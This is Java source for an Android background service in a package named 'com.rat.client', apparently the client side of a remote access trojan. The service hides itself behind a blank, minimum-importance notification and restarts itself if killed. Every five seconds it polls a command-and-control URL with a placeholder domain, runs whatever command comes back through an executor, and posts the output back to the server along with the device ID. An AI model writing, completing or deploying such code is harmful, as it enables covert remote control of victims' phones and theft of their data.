package com.rat.client;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.provider.Settings;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class CoreService extends Service {
    private static final String C2 = "https://panel.SENIN-DOMAIN.com/api";
    private String deviceId;
    private Handler handler = new Handler();
    private Runnable poller = new Runnable() {
        public void run() {
            new Thread(() -> poll()).start();
            handler.postDelayed(this, 5000);
        }
    };

    @Override
    public void onCreate() {
        super.onCreate();
        NotificationChannel ch = new NotificationChannel(
            "svc", "sync", NotificationManager.IMPORTANCE_MIN);
        ((NotificationManager)getSystemService(NOTIFICATION_SERVICE))
            .createNotificationChannel(ch);
        Notification n = new Notification.Builder(this, "svc")
            .setContentTitle("")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .build();
        startForeground(1, n);
    }

    @Override
    public int onStartCommand(Intent i, int f, int s) {
        deviceId = Settings.Secure.getString(
            getContentResolver(), Settings.Secure.ANDROID_ID);
        handler.post(poller);
        return START_STICKY;
    }

    private void poll() {
        try {
            URL u = new URL(C2 + "/poll?id=" + deviceId);
            HttpURLConnection c = (HttpURLConnection) u.openConnection();
            BufferedReader r = new BufferedReader(
                new InputStreamReader(c.getInputStream()));
            String cmd = r.readLine();
            r.close();
            if (cmd != null && !cmd.isEmpty()) {
                String result = Executor.run(this, cmd);
                postResult(result);
            }
        } catch (Exception e) {}
    }

    private void postResult(String data) {
        try {
            URL u = new URL(C2 + "/result");
            HttpURLConnection c = (HttpURLConnection) u.openConnection();
            c.setRequestMethod("POST");
            c.setDoOutput(true);
            OutputStream os = c.getOutputStream();
            os.write(("id=" + deviceId + "&data=" +
                URLEncoder.encode(data, "UTF-8")).getBytes());
            os.close();
        } catch (Exception e) {}
    }

    @Override
    public IBinder onBind(Intent i) { return null; }
              }
